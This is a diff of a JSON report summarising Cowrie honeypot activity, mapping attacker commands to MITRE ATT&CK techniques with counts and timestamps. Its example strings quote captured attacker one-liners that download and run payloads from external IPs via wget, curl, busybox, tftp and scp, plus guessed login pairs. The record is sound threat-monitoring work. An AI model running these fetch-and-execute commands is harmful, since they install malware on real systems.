@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-26 05:04:36",
+  "generated": "2026-08-26 06:04:56",
   "totals": {
-    "commands": 58,
-    "login_failed": 970,
-    "login_success": 17,
-    "sessions": 1084
+    "commands": 97,
+    "login_failed": 1037,
+    "login_success": 25,
+    "sessions": 1176
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 970,
+      "count": 1037,
       "examples": [
         "frappe / epparf",
         "ubuntu / Living@123",
@@ -21,14 +21,14 @@
         "blank / user"
       ],
       "first": "2026-08-26T00:03:18.226679Z",
-      "last": "2026-08-26T05:04:16.011966Z",
-      "unique_ips": 55
+      "last": "2026-08-26T06:03:59.048128Z",
+      "unique_ips": 68
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 17,
+      "count": 25,
       "examples": [
         "root / ",
         "ubnt / ubnt999",
@@ -37,37 +37,53 @@
         "root / 123@@@"
       ],
       "first": "2026-08-26T00:16:32.761158Z",
-      "last": "2026-08-26T05:02:05.596731Z",
-      "unique_ips": 17
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 5,
-      "examples": [
-        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
-        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "http://5.182.210.174/ok"
-      ],
-      "first": "2026-08-26T01:40:57.148328Z",
-      "last": "2026-08-26T05:02:06.260828Z",
-      "unique_ips": 3
+      "last": "2026-08-26T05:58:42.710335Z",
+      "unique_ips": 24
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 5,
+      "count": 21,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-26T01:40:57.148328Z",
-      "last": "2026-08-26T05:02:05.852726Z",
+      "last": "2026-08-26T05:57:58.044186Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 11,
+      "examples": [
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "http://5.182.210.174/ok",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
+      ],
+      "first": "2026-08-26T01:40:57.148328Z",
+      "last": "2026-08-26T05:57:58.044186Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "id",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-26T01:40:56.779330Z",
+      "last": "2026-08-26T05:57:19.200825Z",
       "unique_ips": 4
     },
     {
@@ -81,19 +97,6 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-26T01:56:58.945871Z",
-      "last": "2026-08-26T04:07:38.665167Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 3,
-      "examples": [
-        "id",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-26T01:40:56.779330Z",
       "last": "2026-08-26T04:07:38.665167Z",
       "unique_ips": 3
     },
@@ -139,24 +142,44 @@
   ],
   "unmapped": [
     [
+      "/bin/busybox",
+      7
+    ],
+    [
       "enable",
-      4
+      6
     ],
     [
       "system",
-      4
+      6
     ],
     [
       "shell",
-      4
+      6
     ],
     [
       "sh",
-      4
+      6
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       4
+    ],
+    [
+      "linuxshell",
+      3
+    ],
+    [
+      "enablelinuxshell",
+      3
+    ],
+    [
+      "ping ;sh",
+      3
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      3
     ],
     [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
@@ -192,22 +215,6 @@
     ],
     [
       "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
-      2
-    ],
-    [
-      "linuxshell",
-      2
-    ],
-    [
-      "enablelinuxshell",
-      2
-    ],
-    [
-      "ping ;sh",
-      2
-    ],
-    [
-      "cd /proc && cat self/cmdline",
       2
     ],
     [
